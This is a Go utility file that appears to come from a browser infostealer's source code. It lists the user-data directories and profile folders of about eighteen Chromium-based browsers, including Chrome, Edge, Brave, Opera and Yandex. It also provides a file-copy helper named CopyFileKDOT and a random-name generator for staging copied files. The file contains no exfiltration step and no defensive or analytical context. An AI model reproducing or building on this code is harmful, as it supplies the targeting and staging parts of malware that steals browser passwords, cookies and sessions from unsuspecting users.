package util

import (
	"fmt"
	"io"
	"math/rand"
	"os"
)

func GetProfiles() []string {
	var profiles = []string{
		"Default",
		"Profile 1",
		"Profile 2",
		"Profile 3",
		"Profile 4",
		"Profile 5",
	}
	return profiles
}

func GetBPth() []string {
	local := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")
	var paths = []string{
		local + "\\Amigo\\User Data",
		local + "\\Torch\\User Data",
		local + "\\Kometa\\User Data",
		local + "\\Orbitum\\User Data",
		local + "\\CentBrowser\\User Data",
		local + "\\7Star\\7Star\\User Data",
		local + "\\Sputnik\\Sputnik\\User Data",
		local + "\\Vivaldi\\User Data",
		local + "\\Google\\Chrome SxS\\User Data",
		local + "\\Google\\Chrome\\User Data",
		local + "\\Epic Privacy Browser\\User Data",
		local + "\\Microsoft\\Edge\\User Data",
		local + "\\uCozMedia\\Uran\\User Data",
		local + "\\Yandex\\YandexBrowser\\User Data",
		local + "\\BraveSoftware\\Brave-Browser\\User Data",
		local + "\\Iridium\\User Data",
		roaming + "\\Opera Software\\Opera Stable",
		roaming + "\\Opera Software\\Opera GX Stable",
	}
	return paths
}

func StringToByte(s string) []byte {
	return []byte(s)
}

func CopyFileKDOT(TO_COPY string, DEST string) {
	srcFile, err := os.OpenFile(TO_COPY, os.O_RDONLY, 0644)
	if err != nil {
		fmt.Println("Error opening source file:", err)
		return
	}
	defer srcFile.Close()

	destFile, err := os.Create(DEST)
	if err != nil {
		fmt.Println("Error creating destination file:", err)
		return
	}
	defer destFile.Close()

	// Copy the contents from srcFile to destFile
	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		fmt.Println("Error copying file:", err)
		return
	}

	// Sync the destination file to ensure data is written
	err = destFile.Sync()
	if err != nil {
		fmt.Println("Error syncing destination file:", err)
		return
	}
}

func RandomName() string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, 10)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
